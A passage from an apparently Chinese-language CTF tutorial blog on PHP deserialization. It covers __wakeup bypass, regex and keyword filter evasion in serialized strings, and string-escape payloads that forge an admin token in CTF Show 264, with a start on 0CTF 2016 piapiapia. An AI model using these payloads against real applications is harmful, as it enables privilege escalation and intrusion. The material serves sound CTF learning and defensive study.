@unserialize(<span class="variable">$var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="string">&quot;Gu3ss_m3_h2h2.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="1-6-反序列化绕过技巧"><a href="#1-6-反序列化绕过技巧" class="headerlink" title="1.6 反序列化绕过技巧"></a>1.6 反序列化绕过技巧</h2><h3 id="1-6-1-php7-1-反序列化对类属性不敏感"><a href="#1-6-1-php7-1-反序列化对类属性不敏感" class="headerlink" title="1.6.1 php7.1+反序列化对类属性不敏感"></a>1.6.1 php7.1+反序列化对类属性不敏感</h3><p>测试环境：php7.2.9</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">    protected <span class="variable">$a</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span>  <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/10/zupN4kL8dmvtAEK.png" alt="image-20210910173603013"></p>
<p>可以看到，即是 a 没有<code>%00*%00</code></p>
<p>也输出了 <code>abc</code></p>
<h3 id="1-6-2-wakeup-绕过"><a href="#1-6-2-wakeup-绕过" class="headerlink" title="1.6.2 __wakeup() 绕过"></a>1.6.2 <code>__wakeup()</code> 绕过</h3><p><strong>在反序列化字符串时，序列化字符串中属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行 。</strong></p>
<p>环境： PHP5 &lt; 5.6.2   PHP7 &lt; 7.0.10</p>
<p>测试：php5.2.17</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$b = new test();</span></span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;aaa</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//属性个数 为 真实个数值  1</span></span><br><span class="line">unserialize(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//属性个数 3 &gt; 真实个数值 1</span></span><br><span class="line">unserialize(<span class="string">&#x27;O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/10/ZmtHakew1TCRDVr.png" alt="image-20210910175548494"></p>
<h3 id="1-6-3-正则绕过"><a href="#1-6-3-正则绕过" class="headerlink" title="1.6.3 正则绕过"></a>1.6.3 正则绕过</h3><p><code>preg_match(&#39;/^O:\d+/&#39;)</code>匹配序列化字符串是否是对象字符串开头</p>
<p>其中的 \d 匹配的是数字 [0-9]，其目的就是检测我们的字符串是否是对象字符串开头</p>
<p><strong>绕过1：<code>+</code> 绕过 (url 中传参使用 编码 %2b)</strong></p>
<p><strong>绕过2：<code>serialize(array(a))</code> 绕过  //a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</strong></p>
<p>测试：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you lose!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +号绕过</span></span><br><span class="line"><span class="variable">$b</span> = str_replace(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line">unserialize(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// serialize(array($a));</span></span><br><span class="line">unserialize(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="1-6-4-十六进制绕过字符过滤"><a href="#1-6-4-十六进制绕过字符过滤" class="headerlink" title="1.6.4 十六进制绕过字符过滤"></a>1.6.4 十六进制绕过字符过滤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:4:<span class="string">&quot;test&quot;</span>:2:&#123;s:4:<span class="string">&quot;%00*%00a&quot;</span>;s:3:<span class="string">&quot;abc&quot;</span>;s:7:<span class="string">&quot;%00test%00b&quot;</span>;s:3:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:4:<span class="string">&quot;test&quot;</span>:2:&#123;S:4:<span class="string">&quot;\00*\00\61&quot;</span>;s:3:<span class="string">&quot;abc&quot;</span>;s:7:<span class="string">&quot;%00test%00b&quot;</span>;s:3:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">表示字符类型的s大写时，会被当成16进制解析。</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">    public <span class="variable">$username</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span>  <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> 666;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> check(<span class="variable">$data</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$data</span>, <span class="string">&#x27;username&#x27;</span>)!==False)&#123;</span><br><span class="line">        <span class="built_in">echo</span>(<span class="string">&quot;你绕不过！！&quot;</span>.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 未作处理前</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = check(<span class="variable">$a</span>);</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br><span class="line">// 做处理后 \75是u的16进制</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = check(<span class="variable">$a</span>);</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<h3 id="1-6-5-引用"><a href="#1-6-5-引用" class="headerlink" title="1.6.5 引用"></a>1.6.5 引用</h3><p>测试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__contruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = &amp;<span class="keyword">$this</span>-&gt;a; <span class="comment">// $b 是 $a 的引用,从而使a 与 b 永远相等</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;a === <span class="keyword">$this</span>-&gt;b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = serialize(nre test());</span><br></pre></td></tr></table></figure>

<h1 id="二、反序列化字符串逃逸"><a href="#二、反序列化字符串逃逸" class="headerlink" title="二、反序列化字符串逃逸"></a>二、反序列化字符串逃逸</h1><p>概述：反序列化的字符串逃逸，包括字符增加与字符减少两类。</p>
<h2 id="2-1-知识一："><a href="#2-1-知识一：" class="headerlink" title="2.1 知识一："></a>2.1 知识一：</h2><ul>
<li>PHP 反序列化时，对类中不存在的属性也会反序列化；</li>
<li>PHP 反序列化时，底层代码是以 <code>;</code>作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且是根据长度判断内容的；即当存在 <code>;&#125;</code> 与 <code>&#123;</code>  匹配时，不会再对 <code>;&#125;</code> 后面的字符串进行反序列化。</li>
</ul>
<p> <strong>简单理解一下</strong></p>
<p><img src="https://i.loli.net/2021/06/12/wOtFRIT7QracXNJ.png" alt="image-20210612153444877"></p>
<p><img src="https://i.loli.net/2021/06/12/yp5auIfPciTKWe3.png" alt="image-20210612153557488"></p>
<p>我们在序列化之后的字符串 <code>;&#125;</code> 后再加上一些内容，其仍可被正常解析，说明在 PHP 反序列时碰到 <code>;&#125;</code> 与前面的 <code>&#123;</code> 配对之后，就会停止反序列化。</p>
<h2 id="2-2-知识二："><a href="#2-2-知识二：" class="headerlink" title="2.2 知识二："></a>2.2 知识二：</h2><ul>
<li>当进行反序列化的字符串中长度与所描述的长度不同时，就会 <strong>报错</strong></li>
</ul>
<h2 id="2-3-字符增多-—-CTF-Show-264"><a href="#2-3-字符增多-—-CTF-Show-264" class="headerlink" title="2.3 字符增多 — CTF Show 264"></a>2.3 字符增多 — CTF Show 264</h2><p><a target="_blank" rel="noopener" href="https://ctf.show/challenges#web264-724">题目链接</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># message.php：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># index.php:</span></span><br><span class="line">Your message has been sent <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=base64_encode(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<blockquote>
<ol>
<li>想要获取 flag，需要使 <code>$msg-&gt;token==&#39;admin&#39;</code> ，而默认 <code>public $token=&#39;user&#39;;</code></li>
<li>字符串逃逸：构造 以下内容</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span> = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$msg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ol start="3">
<li>更改 $to 的值</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span> = <span class="string">&#x27;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$msg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:28:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ol start="4">
<li>利用 <code>str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg))</code> 补充字符串长度；增加 27 个长度；</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span> = <span class="string">&#x27;cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$msg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:136:&quot;cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样被替换之后变成以下内容，正好补上 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:136:&quot;cloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>payload：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=a&amp;m=b&amp;t=cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后我们抓包，更改 cookie 即可</p>
<p><img src="https://i.loli.net/2021/06/12/yedxVQwtYGucfm3.png" alt="image-20210612211255566"></p>
<h2 id="2-4-字符增多-—-0CTF-2016-piapiapia"><a href="#2-4-字符增多-—-0CTF-2016-piapiapia" class="headerlink" title="2.4 字符增多 — [0CTF 2016]piapiapia"></a>2.4 字符增多 — [0CTF 2016]piapiapia</h2><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[0CTF%202016]piapiapia">题目链接</a></p>
<p><strong>分析：</strong></p>
<blockquote>
<ol>
<li>目录扫描 ，得到 <a target="_blank" rel="noopener" href="http://www.zip,查看源码/">www.zip，查看源码</a></li>
</ol>
</blockquote>
<p><img src="https://i.loli.net/2021/06/12/duJgi58ZpxNOwQk.png" alt="image-20210612213229646"></p>
<blockquote>
<ol start="2">
<li>register.php ，注册一下</li>
<li>注册成功之后，将跳转 index.php，进行登录</li>
<li>成功登录，跳转到 update.php，填写详细信息，可进行文件上传</li>
</ol>
</blockquote>
